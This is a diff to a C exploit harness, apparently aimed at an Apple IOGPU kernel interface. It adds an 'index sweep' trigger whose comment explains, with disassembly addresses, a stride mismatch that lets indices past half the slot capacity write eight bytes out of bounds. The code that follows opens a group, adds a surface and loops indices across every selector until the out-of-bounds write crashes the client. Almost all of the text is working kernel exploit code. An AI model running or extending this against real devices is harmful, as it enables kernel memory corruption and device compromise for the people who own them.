@@ -469,6 +469,55 @@ void nk_iogpu_group_oob_run(int trigger)
     }
 
 
+
+    if (trigger == 5) {
+        /* INDEX SWEEP.
+         *
+         * The slot table's remove (0x9f518ac) reads its element array at
+         * +0x10 with an 8-byte stride (ubfiz x9, x1, #3), but that array is
+         * allocated as kalloc(capacity*4) - four bytes per slot. The only
+         * bound check is "index < capacity" (0x9f518b4), so any index in
+         * [capacity/2, capacity) writes eight bytes past the end of the
+         * allocation, and the write is a real one:
+         *   0x9f518ec: ldr x8, [x10]
+         *   0x9f518f0: str xzr, [x10]
+         * The index is the slot number, so sweeping it walks the write
+         * across the memory after the array. A kill here is the OOB hitting
+         * an unmapped page.
+         */
+        ol("[grp] === INDEX SWEEP ===");
+        static uint8_t o5[0x200];
+        size_t on5 = 0;
+        int k5 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o5, &on5);
+        uint64_t grp5 = 0;
+        if (k5 == 0) memcpy(&grp5, o5 + 0x10, 8);
+        ol("[grp] group -> kr=0x%x grp=0x%016llx", k5, (unsigned long long)grp5);
+        if (k5 != 0) return;
+        int ka5 = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o5, &on5);
+        ol("[grp] add surf_id=%u -> kr=0x%x", surf_id, ka5);
+
+        static const uint64_t idxs[] = {
+            0,1,2,4,8,16,24,30,31,32,33,40,48,56,60,62,63,64,65,96,128,255,256
+        };
+        for (size_t ii = 0; ii < sizeof(idxs)/sizeof(idxs[0]); ii++) {
+            for (uint32_t cmd = 0; cmd < 256; cmd++) {
+                if (cmd == CMD_NEW_GROUP) continue;
+                uint64_t key = idxs[ii];
+                int kk = call_sel(conn, cmd, key, 1, 0, 0, o5, &on5);
+                if (kk == (int)0x10000003) {
+                    ol("[grp] *** client died at cmd=%u index=0x%llx - the OOB "
+                       "write hit an unmapped page", cmd, (unsigned long long)idxs[ii]);
+                    ol("[grp] index sweep done (dead)");
+                    return;
+                }
+                if (kk == 0) {
+                    ol("[grp] idx=0x%llx cmd=%u -> kr=0", (unsigned long long)idxs[ii], cmd);
+                }
+            }
+        }
+        ol("[grp] index sweep done (no crash)");
+    }
+
     if (trigger == 0 || trigger == 4) {
         /* DUPLICATE ADD = THE REMOVE PATH.
          *
